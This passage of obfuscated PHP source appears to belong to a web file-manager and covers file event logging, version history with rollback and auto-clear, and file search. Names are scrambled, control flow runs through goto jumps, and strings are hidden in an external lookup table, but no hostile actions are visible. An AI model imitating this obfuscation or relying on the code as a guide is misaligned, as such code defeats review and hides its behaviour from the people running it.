$this->addEvent($EØê®õ∆•ﬂ, $E˜õ ≤∏åΩ[1914], $D≠ƒëÆ∑ëﬁ); goto f¿ï˜æ⁄¿Œ; cÏÖÔèîûÎ: $E˜õ ≤∏åΩ =& $_SERVER[ú∫]; $e◊ê√ù≥òù = Model($E˜õ ≤∏åΩ[1206]); $D≈‰ïÿØáí = $e◊ê√ù≥òù->sourceInfo($EÌª†ïäÀˆ); goto FáàÈı÷ŸÑ; FáàÈı÷ŸÑ: $a≈•åÑ∫¡ÿ = $e◊ê√ù≥òù->sourceInfo($EØê®õ∆•ﬂ); $Fò¯ü»˘ÿá = $e◊ê√ù≥òù->sourceInfo($DÚ∞ÙóÔ¯Ë); $D≠ƒëÆ∑ëﬁ = array($E˜õ ≤∏åΩ[1055] => $EØê®õ∆•ﬂ, $E˜õ ≤∏åΩ[1911] => $a≈•åÑ∫¡ÿ[$E˜õ ≤∏åΩ[28]], $E˜õ ≤∏åΩ[1891] => !empty($a≈•åÑ∫¡ÿ[$E˜õ ≤∏åΩ[495]]) ? $a≈•åÑ∫¡ÿ[$E˜õ ≤∏åΩ[495]] : $E˜õ ≤∏åΩ[33], $E˜õ ≤∏åΩ[1056] => $DÚ∞ÙóÔ¯Ë, $E˜õ ≤∏åΩ[1912] => $Fò¯ü»˘ÿá[$E˜õ ≤∏åΩ[28]], $E˜õ ≤∏åΩ[1913] => !empty($Fò¯ü»˘ÿá[$E˜õ ≤∏åΩ[495]]) ? $Fò¯ü»˘ÿá[$E˜õ ≤∏åΩ[495]] : $E˜õ ≤∏åΩ[33]); goto f§⁄“◊ßÚŒ; f§⁄“◊ßÚŒ: $this->addEvent($EÌª†ïäÀˆ, $E˜õ ≤∏åΩ[520], $D≠ƒëÆ∑ëﬁ); $D≈‰ïÿØáí = $e◊ê√ù≥òù->sourceInfo($EÌª†ïäÀˆ); $D≠ƒëÆ∑ëﬁ = array($E˜õ ≤∏åΩ[395] => $D≈‰ïÿØáí[$E˜õ ≤∏åΩ[395]], $E˜õ ≤∏åΩ[28] => $D≈‰ïÿØáí[$E˜õ ≤∏åΩ[28]]); goto CÂπ∞±Ôï†; f¿ï˜æ⁄¿Œ: } public function eventCopy($eÃâÔôõç») { $this->eventCreate($eÃâÔôõç», $_SERVER[ú∫][518]); } public function eventRename($b⁄√πÜÿ·œ, $aà™∆ã—Òê, $EÓ∫ÁÉë‘À) { $A‡∏—„ü à =& $_SERVER[ú∫]; $bÏ≤¬ﬂÔÜ” = array($A‡∏—„ü à[1055] => $aà™∆ã—Òê, $A‡∏—„ü à[1056] => $EÓ∫ÁÉë‘À); return $this->addEvent($b⁄√πÜÿ·œ, $A‡∏—„ü à[1220], $bÏ≤¬ﬂÔÜ”); } public function eventAddComment($F—ø¿πÉíÖ, $Fï≈√≈ÑèË) { return $this->addEvent($F—ø¿πÉíÖ, $_SERVER[ú∫][1915], $Fï≈√≈ÑèË); } public function eventAddDesc($B≥àëÍãÒü, $A‰¥«éèÔ⁄) { return $this->addEvent($B≥àëÍãÒü, $_SERVER[ú∫][1916], $A‰¥«éèÔ⁄); } public function listBySource($d≈ìë∑á»Ö) { goto A¨Ã‡©Çß§; Cç’àíß©À: if ($eãê™Çª‡’[$EæÎç“πˆè[403]] == $EæÎç“πˆè[87]) { $fëÔÂöÏı¶ = Model($EæÎç“πˆè[1206])->listSearchChildren($d≈ìë∑á»Ö, 20000); $fëÔÂöÏı¶[] = $d≈ìë∑á»Ö . $EæÎç“πˆè[375]; $Cêø‡°î—Æ = array($EæÎç“πˆè[395] => array($EæÎç“πˆè[7], $fëÔÂöÏı¶)); } $f€≤ÙÀô‘í = $this->where($Cêø‡°î—Æ)->order($EæÎç“πˆè[1917])->selectPage(); if ($f€≤ÙÀô‘í[$EæÎç“πˆè[364]][$EæÎç“πˆè[365]] == 0) { $f€≤ÙÀô‘í[$EæÎç“πˆè[364]][$EæÎç“πˆè[365]] = 1; $f€≤ÙÀô‘í[$EæÎç“πˆè[367]] = array(array($EæÎç“πˆè[410] => $d≈ìë∑á»Ö, $EæÎç“πˆè[1900] => $eãê™Çª‡’[$EæÎç“πˆè[478]], $EæÎç“πˆè[1520] => $eãê™Çª‡’[$EæÎç“πˆè[432]], $EæÎç“πˆè[415] => $EæÎç“πˆè[1918], $EæÎç“πˆè[416] => $eãê™Çª‡’[$EæÎç“πˆè[194]], $EæÎç“πˆè[1522] => $EæÎç“πˆè[33])); } goto c»”—Ñ¶˘; c»”—Ñ¶˘: return $this->eventListParse($f€≤ÙÀô‘í, $d≈ìë∑á»Ö); goto DÑµÏ¿©¡˜; A¨Ã‡©Çß§: $EæÎç“πˆè =& $_SERVER[ú∫]; $eãê™Çª‡’ = Model($EæÎç“πˆè[1206])->sourceInfo($d≈ìë∑á»Ö); $Cêø‡°î—Æ = array($EæÎç“πˆè[410] => $d≈ìë∑á»Ö); goto Cç’àíß©À; DÑµÏ¿©¡˜: } private function eventListParse($EŒ¡˘∞•£¨, $FÊ·ëÚ’Î›) { goto A±ˆÚÀèª»; A±ˆÚÀèª»: $aÃØí√Áèπ =& $_SERVER[ú∫]; $d—‘åŸÉ†Â = $EŒ¡˘∞•£¨[$aÃØí√Áèπ[367]]; $C⁄øÁäöƒŸ = array_to_keyvalue($d—‘åŸÉ†Â, $aÃØí√Áèπ[33], $aÃØí√Áèπ[395]); goto D£ÀÓÖì¢Œ; D£ÀÓÖì¢Œ: $e¿ªÿŒÑºÜ = array_to_keyvalue($d—‘åŸÉ†Â, $aÃØí√Áèπ[33], $aÃØí√Áèπ[1906]); foreach ($d—‘åŸÉ†Â as $c¿á∑øÇÒñ) { $e∆¢–µÏ¬ñ = $c¿á∑øÇÒñ[$aÃØí√Áèπ[431]]; if ($c¿á∑øÇÒñ[$aÃØí√Áèπ[29]] == $aÃØí√Áèπ[520] && isset($e∆¢–µÏ¬ñ[$aÃØí√Áèπ[1055]])) { $C⁄øÁäöƒŸ[] = $e∆¢–µÏ¬ñ[$aÃØí√Áèπ[1055]] . $aÃØí√Áèπ[33]; $C⁄øÁäöƒŸ[] = $e∆¢–µÏ¬ñ[$aÃØí√Áèπ[1056]] . $aÃØí√Áèπ[33]; } if ($c¿á∑øÇÒñ[$aÃØí√Áèπ[29]] == $aÃØí√Áèπ[1914] && isset($e∆¢–µÏ¬ñ[$aÃØí√Áèπ[395]])) { $C⁄øÁäöƒŸ[] = $e∆¢–µÏ¬ñ[$aÃØí√Áèπ[395]] . $aÃØí√Áèπ[33]; } } $C⁄øÁäöƒŸ = array_merge($C⁄øÁäöƒŸ, $e¿ªÿŒÑºÜ, array($FÊ·ëÚ’Î› . $aÃØí√Áèπ[33])); goto cÎÇﬁﬂ£÷Ò; cëç ≤ÓÇ˜: $EŒ¡˘∞•£¨[$aÃØí√Áèπ[367]] = $d—‘åŸÉ†Â; return $EŒ¡˘∞•£¨; goto F’πùñûÇ¬; eà·ñÜÎÌ: $BàÚ∞®òíê = Model($aÃØí√Áèπ[790])->sourceListInfo($C⁄øÁäöƒŸ, !0); foreach ($d—‘åŸÉ†Â as &$c¿á∑øÇÒñ) { if ($c¿á∑øÇÒñ[$aÃØí√Áèπ[29]] == $aÃØí√Áèπ[520] && isset($c¿á∑øÇÒñ[$aÃØí√Áèπ[431]][$aÃØí√Áèπ[1055]])) { $c¿á∑øÇÒñ[$aÃØí√Áèπ[431]][$aÃØí√Áèπ[1055]] = $BàÚ∞®òíê[$c¿á∑øÇÒñ[$aÃØí√Áèπ[431]][$aÃØí√Áèπ[1055]]]; $c¿á∑øÇÒñ[$aÃØí√Áèπ[431]][$aÃØí√Áèπ[1056]] = $BàÚ∞®òíê[$c¿á∑øÇÒñ[$aÃØí√Áèπ[431]][$aÃØí√Áèπ[1056]]]; } if ($c¿á∑øÇÒñ[$aÃØí√Áèπ[29]] == $aÃØí√Áèπ[1914] && isset($c¿á∑øÇÒñ[$aÃØí√Áèπ[431]][$aÃØí√Áèπ[395]])) { $c¿á∑øÇÒñ[$aÃØí√Áèπ[431]][$aÃØí√Áèπ[395]] = $BàÚ∞®òíê[$c¿á∑øÇÒñ[$aÃØí√Áèπ[431]][$aÃØí√Áèπ[395]]]; } $c¿á∑øÇÒñ[$aÃØí√Áèπ[85]] = $BàÚ∞®òíê[$c¿á∑øÇÒñ[$aÃØí√Áèπ[395]]]; $c¿á∑øÇÒñ[$aÃØí√Áèπ[1919]] = $BàÚ∞®òíê[$c¿á∑øÇÒñ[$aÃØí√Áèπ[1906]]]; if ($c¿á∑øÇÒñ[$aÃØí√Áèπ[29]] == $aÃØí√Áèπ[1658]) { $c¿á∑øÇÒñ[$aÃØí√Áèπ[1919]] = $c¿á∑øÇÒñ[$aÃØí√Áèπ[85]]; $c¿á∑øÇÒñ[$aÃØí√Áèπ[1906]] = $c¿á∑øÇÒñ[$aÃØí√Áèπ[1919]][$aÃØí√Áèπ[395]]; $c¿á∑øÇÒñ[$aÃØí√Áèπ[85]] = !1; $c¿á∑øÇÒñ[$aÃØí√Áèπ[395]] = $aÃØí√Áèπ[33]; } $c¿á∑øÇÒñ[$aÃØí√Áèπ[1849]] = $d∏†…’âëë[$c¿á∑øÇÒñ[$aÃØí√Áèπ[1528]]]; } unset($c¿á∑øÇÒñ); goto cëç ≤ÓÇ˜; cÎÇﬁﬂ£÷Ò: $C⁄øÁäöƒŸ = array_unique($C⁄øÁäöƒŸ); $dß–ñÔÑÚ‘ = array_unique(array_to_keyvalue($d—‘åŸÉ†Â, $aÃØí√Áèπ[33], $aÃØí√Áèπ[1528])); $d∏†…’âëë = Model($aÃØí√Áèπ[506])->userListInfo($dß–ñÔÑÚ‘); goto eà·ñÜÎÌ; F’πùñûÇ¬: } public function removeBySource($E‹¨®òÖëﬁ) { $CÛ«„£‰íõ = array($_SERVER[ú∫][410] => $E‹¨®òÖëﬁ); $this->where($CÛ«„£‰íõ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\x63\x65\137\150\151\x73\x74\x6f\162\x79"; public function historyCount($E≠ππçïàı) { goto EË∫ΩΩ‹…√; EË∫ΩΩ‹…√: $Fèµà…Ωá« =& $_SERVER[ú∫]; if (!$E≠ππçïàı) { return array(); } if (is_string($E≠ππçïàı) || is_int($E≠ππçïàı)) { $E≠ππçïàı = array($E≠ππçïàı); } goto A¿Èó‚øõÏ; A¿Èó‚øõÏ: $BÈ∑Ÿ‡àÏ÷ = array($Fèµà…Ωá«[395], $Fèµà…Ωá«[1724] => $Fèµà…Ωá«[480]); $e¥‘å–«≠õ = array($Fèµà…Ωá«[395] => array($Fèµà…Ωá«[7], $E≠ππçïàı)); $CùÈÏäûÖÃ = $this->field($BÈ∑Ÿ‡àÏ÷)->where($e¥‘å–«≠õ)->group($Fèµà…Ωá«[395])->select(); goto Cıá∞ƒ¿Œé; Cıá∞ƒ¿Œé: return array_to_keyvalue($CùÈÏäûÖÃ, $Fèµà…Ωá«[395], $Fèµà…Ωá«[480]); goto B«ú°◊»ñŒ; B«ú°◊»ñŒ: } public function addHistory($CÃãÆÓÿØÍ, $bäË¨÷·îÀ = '') { $A»ö¬‰ãÉ‹ =& $_SERVER[ú∫]; $EÁò…¶ºÈ = array($A»ö¬‰ãÉ‹[410] => $CÃãÆÓÿØÍ[$A»ö¬‰ãÉ‹[395]], $A»ö¬‰ãÉ‹[1520] => isset($CÃãÆÓÿØÍ[$A»ö¬‰ãÉ‹[434]]) ? $CÃãÆÓÿØÍ[$A»ö¬‰ãÉ‹[434]] : $CÃãÆÓÿØÍ[$A»ö¬‰ãÉ‹[432]], $A»ö¬‰ãÉ‹[448] => $CÃãÆÓÿØÍ[$A»ö¬‰ãÉ‹[447]], $A»ö¬‰ãÉ‹[548] => $CÃãÆÓÿØÍ[$A»ö¬‰ãÉ‹[78]], $A»ö¬‰ãÉ‹[1920] => $bäË¨÷·îÀ); $D◊Ëæ“ë∫ó = $GLOBALS[$A»ö¬‰ãÉ‹[6]][$A»ö¬‰ãÉ‹[88]][$A»ö¬‰ãÉ‹[1104]]; if ($D◊Ëæ“ë∫ó > 1) { $this->historyAutoClear($EÁò…¶ºÈ[$A»ö¬‰ãÉ‹[395]]); $this->add($EÁò…¶ºÈ); } Hook::trigger($A»ö¬‰ãÉ‹[1921], $EÁò…¶ºÈ); Model($A»ö¬‰ãÉ‹[1922])->eventFileEdit($CÃãÆÓÿØÍ[$A»ö¬‰ãÉ‹[395]]); } private function historyAutoClear($e·Í„¬¯ø˘) { goto AñÌ…ëÂèπ; AñÌ…ëÂèπ: $a†Â™‘∑•Ü =& $_SERVER[ú∫]; $e¯äêóÈ”‰ = Model($a†Â™‘∑•Ü[730])->get($a†Â™‘∑•Ü[1126]); $BÖ¿«ò âÊ = $GLOBALS[$a†Â™‘∑•Ü[6]][$a†Â™‘∑•Ü[88]][$a†Â™‘∑•Ü[1104]]; goto b‚Ê≈éﬂÖπ; Aö—ë«èø: $f√Óîçã›ê = array_slice($f√Óîçã›ê, $f‡»äÚÒÍä); if (!$F‡â∞êÓÑì || !$f√Óîçã›ê) { return; } $bÃ¨ù¬€Ôò = array($a†Â™‘∑•Ü[412] => array($a†Â™‘∑•Ü[7], $F‡â∞êÓÑì)); goto eÒã√ÌÂôö; FÌé•ˆàÁå: $F‡â∞êÓÑì = array_to_keyvalue($bå¨¨ÓÍı€, $a†Â™‘∑•Ü[33], $a†Â™‘∑•Ü[393]); $F‡â∞êÓÑì = array_slice($F‡â∞êÓÑì, $f‡»äÚÒÍä); $f√Óîçã›ê = array_to_keyvalue($bå¨¨ÓÍı€, $a†Â™‘∑•Ü[33], $a†Â™‘∑•Ü[447]); goto Aö—ë«èø; b∂§Ö∏¡õ≥: $bÃ¨ù¬€Ôò = array($a†Â™‘∑•Ü[410] => $e·Í„¬¯ø˘); $bå¨¨ÓÍı€ = $this->field($a†Â™‘∑•Ü[1923])->where($bÃ¨ù¬€Ôò)->order($a†Â™‘∑•Ü[1917])->select(); if (!$bå¨¨ÓÍı€ || $f‡»äÚÒÍä >= count($bå¨¨ÓÍı€)) { return; } goto FÌé•ˆàÁå; eÒã√ÌÂôö: $this->where($bÃ¨ù¬€Ôò)->delete(); Model($a†Â™‘∑•Ü[450])->remove($f√Óîçã›ê); goto eﬂ“©˘º∂è; b‚Ê≈éﬂÖπ: $f‡»äÚÒÍä = $e¯äêóÈ”‰ == $a†Â™‘∑•Ü[1127] ? 5 : $BÖ¿«ò âÊ; if ($BÖ¿«ò âÊ <= 1) { $f‡»äÚÒÍä = 1; } if ($f‡»äÚÒÍä >= 500) { return; } goto b∂§Ö∏¡õ≥; eﬂ“©˘º∂è: } public function listData($eÎÁ– ﬁ‚¥) { goto E∂—ÿ⁄£Ωç; fÍÜêà§çâ: $e∑Èò∫«Ü› = $this->field($FåÉÑÔ«‚ç)->where($Aã◊ÍåÛõ–)->order($a¬ÌÿµÚÉ∆[1917])->selectPage(); $this->_listAppendUser($e∑Èò∫«Ü›[$a¬ÌÿµÚÉ∆[367]]); $AµªÀÔ•∫÷ = Model($a¬ÌÿµÚÉ∆[730])->get($a¬ÌÿµÚÉ∆[1126]); goto f·ôÃ∞ùç•; E∂—ÿ⁄£Ωç: $a¬ÌÿµÚÉ∆ =& $_SERVER[ú∫]; $Aã◊ÍåÛõ– = array($a¬ÌÿµÚÉ∆[410] => $eÎÁ– ﬁ‚¥); $FåÉÑÔ«‚ç = $a¬ÌÿµÚÉ∆[1924]; goto fÍÜêà§çâ; f·ôÃ∞ùç•: $e§∑Ôõå÷‰ = 5; if ($AµªÀÔ•∫÷ == $a¬ÌÿµÚÉ∆[1127]) { $e∑Èò∫«Ü›[$a¬ÌÿµÚÉ∆[367]] = array_slice($e∑Èò∫«Ü›[$a¬ÌÿµÚÉ∆[367]], 0, $e§∑Ôõå÷‰); $e∑Èò∫«Ü›[$a¬ÌÿµÚÉ∆[364]] = array($a¬ÌÿµÚÉ∆[1925] => 1, $a¬ÌÿµÚÉ∆[1926] => 20, $a¬ÌÿµÚÉ∆[1927] => 1, $a¬ÌÿµÚÉ∆[1928] => count($e∑Èò∫«Ü›[$a¬ÌÿµÚÉ∆[367]])); } return $e∑Èò∫«Ü›; goto E◊ôıÆ†ËΩ; E◊ôıÆ†ËΩ: } protected function _listAppendUser(&$F∆êé≥íÈÖ) { $Eâƒ–«Òú’ =& $_SERVER[ú∫]; $d†ëô•≈†™ = array_to_keyvalue($F∆êé≥íÈÖ, $Eâƒ–«Òú’[33], $Eâƒ–«Òú’[1528]); $fõ©ãÈµÊ« = Model($Eâƒ–«Òú’[506])->userListInfo($d†ëô•≈†™); foreach ($F∆êé≥íÈÖ as &$dÕäˆÀ÷√π) { $D‰∏ÌŸÒù = $dÕäˆÀ÷√π[$Eâƒ–«Òú’[1528]]; $dÕäˆÀ÷√π[$Eâƒ–«Òú’[432]] = $fõ©ãÈµÊ«[$D‰∏ÌŸÒù] ? $fõ©ãÈµÊ«[$D‰∏ÌŸÒù] : !1; } unset($dÕäˆÀ÷√π); } public function fileInfo($dú∏ÃøüÙá) { $dùæÒ≤ãºÇ =& $_SERVER[ú∫]; $D±ç◊Ü±ﬂŒ = $this->tablePrefix; $C”ŒÌóÃΩÌ = "{$D±ç◊Ü±ﬂŒ}\x69\157\x5f\146\151\x6c\x65\x20\146\151\154\x65\x73\x20\157\156\x20\x66\x69\154\x65\163\x2e\146\151\154\x65\111\104\40\75\40\150\x69\163\164\157\x72\171\x2e\146\x69\154\145\111\104"; return $this->alias($dùæÒ≤ãºÇ[1929])->where(array($dùæÒ≤ãºÇ[412] => $dú∏ÃøüÙá))->join($C”ŒÌóÃΩÌ, $dùæÒ≤ãºÇ[1930])->find(); } public function removeItem($BÂø•∞ÓÑ£) { $F÷ä∫âÙë√ =& $_SERVER[ú∫]; $f—ÂπúˆÚﬁ = array($F÷ä∫âÙë√[412] => $BÂø•∞ÓÑ£); $c©µπ´ä¢Œ = $this->where($f—ÂπúˆÚﬁ)->find(); if ($c©µπ´ä¢Œ) { $A¿‹É€”ˆÇ = $this->where($f—ÂπúˆÚﬁ)->delete(); Model($F÷ä∫âÙë√[450])->remove($c©µπ´ä¢Œ[$F÷ä∫âÙë√[447]]); return $A¿‹É€”ˆÇ; } return !1; } public function removeBySource($C’∏’ëÒÖë) { goto dÖÌøèçÃ¶; Döôœ€ÊÚ£: $CÏÈ⁄≠“°ø = array($f™Ï⁄Ì´Üç[410] => array($f™Ï⁄Ì´Üç[7], $C’∏’ëÒÖë)); $eƒ”êáåÉ¨ = $this->field($f™Ï⁄Ì´Üç[448])->where($CÏÈ⁄≠“°ø)->select(); if ($eƒ”êáåÉ¨) { $this->where($CÏÈ⁄≠“°ø)->delete(); $cÖœÿÂ«Øì = array_to_keyvalue($eƒ”êáåÉ¨, $f™Ï⁄Ì´Üç[33], $f™Ï⁄Ì´Üç[447]); Model($f™Ï⁄Ì´Üç[450])->remove($cÖœÿÂ«Øì); } goto CÉœ±»õãí; CÉœ±»õãí: return !0; goto DƒΩÁú–úª; dÖÌøèçÃ¶: $f™Ï⁄Ì´Üç =& $_SERVER[ú∫]; if (!$C’∏’ëÒÖë) { return !1; } if (!is_array($C’∏’ëÒÖë)) { $C’∏’ëÒÖë = array($C’∏’ëÒÖë); } goto Döôœ€ÊÚ£; DƒΩÁú–úª: } public function setDetail($cÀˆ∏ÇÎä„, $C¨ëéœ¬¯‰) { $bŒÓøÇ¶øô =& $_SERVER[ú∫]; return $this->where(array($bŒÓøÇ¶øô[412] => $cÀˆ∏ÇÎä„))->save(array($bŒÓøÇ¶øô[1920] => $C¨ëéœ¬¯‰)); } public function rollbackToItem($B£Æ∞≈¿ ≈, $AÀ€€ÿÜ≤≤) { goto FáâÕ—ÂË; Aı¡ƒê°ù‡: $e≠ΩÊûı‰Õ = $this->find($AÀ€€ÿÜ≤≤); $F∏˘“‘Œ≠¿ = array($A‚îãò≈ò—[447] => $e≠ΩÊûı‰Õ[$A‚îãò≈ò—[447]], $A‚îãò≈ò—[78] => $e≠ΩÊûı‰Õ[$A‚îãò≈ò—[78]], $A‚îãò≈ò—[84] => time(), $A‚îãò≈ò—[434] => USER_ID); Model($A‚îãò≈ò—[790])->where(array($A‚îãò≈ò—[395] => $B£Æ∞≈¿ ≈))->save($F∏˘“‘Œ≠¿); goto A¯ÁµÍœ•; FáâÕ—ÂË: $A‚îãò≈ò— =& $_SERVER[ú∫]; $aÒ∑™€¶ã = Model($A‚îãò≈ò—[790])->sourceInfo($B£Æ∞≈¿ ≈); $this->addHistory($aÒ∑™€¶ã, LNG($A‚îãò≈ò—[1931])); goto Aı¡ƒê°ù‡; A¯ÁµÍœ•: return $this->where(array($A‚îãò≈ò—[412] => $AÀ€€ÿÜ≤≤))->delete(); goto E⁄Ô¬õ¶‹®; E⁄Ô¬õ¶‹®: } public function clearSame($AÖÊÕàÛ‘¨) { goto E›·ı≤Çö÷; e–Ö¶ò≥ÂÛ: $B£ªŒ¨ìºÖ = array(); $BóÉìöâ¨È = array(); foreach ($bêñÚïç√ò as $aéÙ≠ˆä›ï) { if (!$aéÙ≠ˆä›ï || count($aéÙ≠ˆä›ï) <= 1) { continue; } foreach ($aéÙ≠ˆä›ï as $eÖˆ“ÿ˜Ú®) { $B£ªŒ¨ìºÖ[] = $eÖˆ“ÿ˜Ú®[$DÀÓ©≈ÎÇ¶[447]]; $BóÉìöâ¨È[] = $eÖˆ“ÿ˜Ú®[$DÀÓ©≈ÎÇ¶[393]]; } } goto FÓöÀù™…à; E›·ı≤Çö÷: $DÀÓ©≈ÎÇ¶ =& $_SERVER[ú∫]; $E¿èñ¶èüÖ = $this->listData($AÖÊÕàÛ‘¨); $bêñÚïç√ò = array_to_keyvalue_group($E¿èñ¶èüÖ, $DÀÓ©≈ÎÇ¶[447]); goto e–Ö¶ò≥ÂÛ; FÓöÀù™…à: if (!$BóÉìöâ¨È) { return; } $this->where(array($DÀÓ©≈ÎÇ¶[393] => array($DÀÓ©≈ÎÇ¶[7], $BóÉìöâ¨È)))->delete(); Model($DÀÓ©≈ÎÇ¶[450])->remove($B£ªŒ¨ìºÖ); goto føÜÎÀÖ; føÜÎÀÖ: } public function userSpace() { $D∞«ˆ¡¬∏Ω =& $_SERVER[ú∫]; $E÷ß©¯úö√ = $this->tablePrefix; $c™±Ìù£ë≤ = array($D∞«ˆ¡¬∏Ω[1520] => USER_ID); $e•¯ÁäÛÊÊ = "{$E÷ß©¯úö√}\x69\x6f\137\x66\x69\x6c\145\40\146\151\154\145\163\40\157\156\x20\146\151\154\x65\163\56\146\151\154\145\x49\x44\x20\75\x20\150\x69\163\164\x6f\162\x79\56\x66\151\x6c\x65\111\104"; return $this->alias($D∞«ˆ¡¬∏Ω[1929])->where($c™±Ìù£ë≤)->join($e•¯ÁäÛÊÊ, $D∞«ˆ¡¬∏Ω[1930])->sum($D∞«ˆ¡¬∏Ω[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($FÛèﬂ˘ÈÚã) { goto Fú«Ç≤éÇá; eöŒ≤≈÷ª∂: if (!$AÇÂ÷ÿÎ√¶[$E∑ÙñáõÉ¥[168]]) { $eÚ…‹É¶ÏΩ = array_to_keyvalue($dä¡‚úûÇÁ, $E∑ÙñáõÉ¥[33], $E∑ÙñáõÉ¥[168]); $Döã†¢¡‰Ö = implode($E∑ÙñáõÉ¥[47], $eÚ…‹É¶ÏΩ); $fÀﬂœê†¢´ = $E∑ÙñáõÉ¥[1932]; } $AíáòåíñÇ = explode($E∑ÙñáõÉ¥[47], trim($Döã†¢¡‰Ö, $E∑ÙñáõÉ¥[47])); return array($fÀﬂœê†¢´, $AíáòåíñÇ); goto cÍ§∏◊Ùßæ; Dèèπ˘ÑËπ: if (!$AÇÂ÷ÿÎ√¶) { return array(); } $Döã†¢¡‰Ö = $AÇÂ÷ÿÎ√¶[$E∑ÙñáõÉ¥[168]]; $fÀﬂœê†¢´ = $E∑ÙñáõÉ¥[7]; goto eöŒ≤≈÷ª∂; Fú«Ç≤éÇá: $E∑ÙñáõÉ¥ =& $_SERVER[ú∫]; $dä¡‚úûÇÁ = KodIO::fileTypeList(); $AÇÂ÷ÿÎ√¶ = $dä¡‚úûÇÁ[$FÛèﬂ˘ÈÚã]; goto Dèèπ˘ÑËπ; cÍ§∏◊Ùßæ: } public function listPathType($F§«êÃˆâÛ) { $c™ﬁá¢≥Â± =& $_SERVER[ú∫]; $F∂È®Ã∆â· = $this->fileTypeWhere($F§«êÃˆâÛ); if (!$F∂È®Ã∆â·) { return array(); } $fΩ ﬁ”Ê”„ = array($c™ﬁá¢≥Â±[549] => SourceModel::TYPE_USER, $c™ﬁá¢≥Â±[550] => USER_ID, $c™ﬁá¢≥Â±[546] => 0, $c™ﬁá¢≥Â±[547] => $F∂È®Ã∆â·); return $this->listSource($fΩ ﬁ”Ê”„); } public function listSearch($C£‘ƒã¿ûÖ, $b£ÉãÚ∂å£ = 300) { goto dê±Î‘∂—Ù; FÊÈ´í¯¨É: $this->_listSearchTag($c„€ﬂó—◊ﬂ, $C£‘ƒã¿ûÖ, $F»Ê¬Áèƒ¥); $this->_listSearchGroupTag($c„€ﬂó—◊ﬂ, $C£‘ƒã¿ûÖ, $F»Ê¬Áèƒ¥); $this->_listDataApply($c„€ﬂó—◊ﬂ[$A≥ÉÒ˜ô†«[367]]); goto B‹”®Ãúê ; f∆à»‘è≤µ: $this->_listSearchBindPinyin($C£‘ƒã¿ûÖ, $b“ÆÇ∂Ÿ∑≠, $BªÛ≤Ò´áÏ); $this->alias($A≥ÉÒ˜ô†«[516])->_makeOrder(); $b“ÆÇ∂Ÿ∑≠ = $this->parseWhereLike($b“ÆÇ∂Ÿ∑≠); goto fﬂêÖç™±Ï; B˜∞ºÏìÀ: if (!isset($b“ÆÇ∂Ÿ∑≠[$A≥ÉÒ˜ô†«[423]])) { $b“ÆÇ∂Ÿ∑≠[$A≥ÉÒ˜ô†«[423]] = 0; } $BªÛ≤Ò´áÏ = $A≥ÉÒ˜ô†«[1934]; $F»Ê¬Áèƒ¥ = $BªÛ≤Ò´áÏ; goto f∆à»‘è≤µ; B‹”®Ãúê : $this->_listMake($c„€ﬂó—◊ﬂ); return $c„€ﬂó—◊ﬂ; goto CÉ≥…ê©¨†; dê±Î‘∂—Ù: $A≥ÉÒ˜ô†« =& $_SERVER[ú∫]; if (isset($C£‘ƒã¿ûÖ[$A≥ÉÒ˜ô†«[1775]]) && $C£‘ƒã¿ûÖ[$A≥ÉÒ˜ô†«[1775]]) { $C£‘ƒã¿ûÖ[$A≥ÉÒ˜ô†«[1775]] = str_replace($A≥ÉÒ˜ô†«[381], $A≥ÉÒ˜ô†«[1933], trim($C£‘ƒã¿ûÖ[$A≥ÉÒ˜ô†«[1775]])); } $b“ÆÇ∂Ÿ∑≠ = $this->_parseSearchWhere($C£‘ƒã¿ûÖ); goto B˜∞ºÏìÀ; fﬂêÖç™±Ï: $c„€ﬂó—◊ﬂ = $this->distinct(!0)->field($BªÛ≤Ò´áÏ)->where($b“ÆÇ∂Ÿ∑≠)->selectPage($b£ÉãÚ∂å£); $this->_listSearchFileContent($c„€ﬂó—◊ﬂ, $C£‘ƒã¿ûÖ, $F»Ê¬Áèƒ¥); $this->_listSearchDesc($c„€ﬂó—◊ﬂ, $C£‘ƒã¿ûÖ, $F»Ê¬Áèƒ¥); goto FÊÈ´í¯¨É; CÉ≥…ê©¨†: } private function _listSearchFileContent(&$C†∏Ã≈∂Ω®, $Bê‚»†ßÉ≠, $BÛä‰ÿëùœ) { goto DˆﬁÜÖî›ı; d Ìª‰˜Öª: $C†∏Ã≈∂Ω®[$Bûé±óØ†Ç[367]] = array_merge($Eê⁄ÎÜ∆ı¢, $C†∏Ã≈∂Ω®[$Bûé±óØ†Ç[367]]); $C†∏Ã≈∂Ω®[$Bûé±óØ†Ç[364]][$Bûé±óØ†Ç[365]] += count($Eê⁄ÎÜ∆ı¢); goto C›·Ò£∫Ã¿; eÍøÀ‘≈¿–: if (!isset($A‘ƒÚ„ßÔı[$Bûé±óØ†Ç[28]]) || !is_array($Bê‚»†ßÉ≠[$Bûé±óØ†Ç[447]])) { return; } $A‘ƒÚ„ßÔı[$Bûé±óØ†Ç[447]] = array($Bûé±óØ†Ç[7], $Bê‚»†ßÉ≠[$Bûé±óØ†Ç[447]]); unset($A‘ƒÚ„ßÔı[$Bûé±óØ†Ç[28]]); goto CÎ∏ƒÛÍòÃ; CÎ∏ƒÛÍòÃ: unset($Bê‚»†ßÉ≠[$Bûé±óØ†Ç[447]]); $Eê⁄ÎÜ∆ı¢ = $this->field($BÛä‰ÿëùœ)->where($A‘ƒÚ„ßÔı)->limit($Bûé±óØ†Ç[1935])->select(); if (!$Eê⁄ÎÜ∆ı¢ || count($Eê⁄ÎÜ∆ı¢) == 0) { return; } goto d Ìª‰˜Öª; DˆﬁÜÖî›ı: $Bûé±óØ†Ç =& $_SERVER[ú∫]; if (!$Bê‚»†ßÉ≠[$Bûé±óØ†Ç[1775]] || $C†∏Ã≈∂Ω®[$Bûé±óØ†Ç[364]][$Bûé±óØ†Ç[351]] > 1) { return; } $A‘ƒÚ„ßÔı = $this->_parseSearchWhere($Bê‚»†ßÉ≠); goto eÍøÀ‘≈¿–; C›·Ò£∫Ã¿: } private function _listSearchTag(&$D§‰‚‚ë¬å, $c™Øø∫Í¶›, $aïàÌ«∫ê¥) { goto A  ≈ﬂÌ°ç; EüÂŒ∑Ú‘Ω: if (!$eÒÆ„î‚∞Ê) { return; } $D•´ ‹Œ∫∆ = array($FÚÕÕÙ¿ÓÂ[419] => array($FÚÕÕÙ¿ÓÂ[7], $eÒÆ„î‚∞Ê), $FÚÕÕÙ¿ÓÂ[1528] => USER_ID); 